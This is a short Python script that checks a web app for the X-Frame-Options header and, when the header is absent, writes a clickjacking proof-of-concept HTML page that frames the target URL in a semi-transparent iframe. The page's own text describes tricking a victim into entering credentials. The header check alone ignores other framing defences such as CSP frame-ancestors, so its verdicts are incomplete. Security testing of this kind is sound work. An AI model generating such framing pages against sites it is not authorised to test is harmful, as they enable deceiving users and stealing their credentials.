import requests
from termcolor import colored
import os

def check_clickjacking_protection():
    # Ask the user for the web app URL
    url = input("What is the link of your web app? ").strip()
    
    try:
        # Send a request to the provided URL
        response = requests.get(url)
        
        # Check for the X-Frame-Options header in the response
        x_frame_options = response.headers.get("X-Frame-Options")
        
        if x_frame_options:
            # If the header is present, print a green message
            print(colored("Your web app is protected against Clickjacking.", "green"))
        else:
            # If the header is missing, print a red warning message
            print(colored("Your web app is vulnerable to clickjacking.", "red"))
            
            # Generate the HTML file for clickjacking PoC
            domain_name = url.replace("https://", "").replace("http://", "").split("/")[0]
            filename = f"ClickjackingPoC_{domain_name}.html"
            
            # HTML content for PoC
            html_content = f"""
            <html>
                <div style="z-index:2; position:absolute;top:0; left:0;width: 100%; height:100%">
                    <iframe src="{url}" style="opacity:0.4;filter:alpha(opacity=40);" width="100%" height="100%" onmouseover="this.style.opacity=.5;this.filters.alpha.opacity=50" onmouseout="this.style.opacity=0.2;this.filters.alpha.opacity=0.2"></iframe>
                </div>
                <div align="right" style="position:absolute; top:0; left:0; z-index:1; width: 100%;height:100%; background-color: yellow;text-align:left;">
                    <strong>Clickjacking: Proof Of Concept. <br> The upper frame changes to become partially transparent by means of a JavaScript script when the mouse pointer is over the frame. This behavior allows both the upper and lower frame to be seen. The aim is to entice the victim to visit a malicious site that displays the contents of the lower frame. The victim inserts his or her credentials thinking he or she is interacting with the content of the lower frame, while unknowingly registering for the service in question.</strong><br/>
                </div>
            </html>
            """
            
            # Save the PoC HTML to a file
            with open(filename, "w") as file:
                file.write(html_content)
                
            # Notify the user about the PoC file
            print("Find the Proof of Concept here:", filename)
            print("Open the file with your favorite web browser")
    
    except requests.RequestException as e:
        print(colored("An error occurred while trying to access the URL. Please check the URL and try again.", "red"))

# Run the clickjacking protection check
check_clickjacking_protection()
